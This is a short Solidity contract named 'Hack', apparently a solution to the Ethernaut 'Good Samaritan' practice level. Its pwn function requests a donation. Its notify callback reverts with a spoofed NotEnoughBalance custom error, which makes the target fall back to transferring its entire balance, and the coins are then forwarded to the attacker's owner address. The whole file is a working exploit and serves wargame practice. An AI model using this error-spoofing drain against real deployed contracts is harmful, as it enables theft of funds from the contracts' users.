// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

import { GoodSamaritan, Coin } from "./GoodSamaritan.sol";

contract Hack {
    GoodSamaritan public gs;
    Coin public coin;
    address private owner;

    constructor(
        address _goodSamaritanAddress,
        address _coinAddress,
        address _owner
    ) {
        gs = GoodSamaritan(_goodSamaritanAddress);
        coin = Coin(_coinAddress);
        owner = _owner;
    }
    
    error NotEnoughBalance();

    function pwn() external {
        gs.requestDonation();
    }

    function notify(uint256 amount) external {
        if (amount == 10) {
            revert NotEnoughBalance();
        }
        else {
            coin.transfer(owner, amount);
        }
    }
}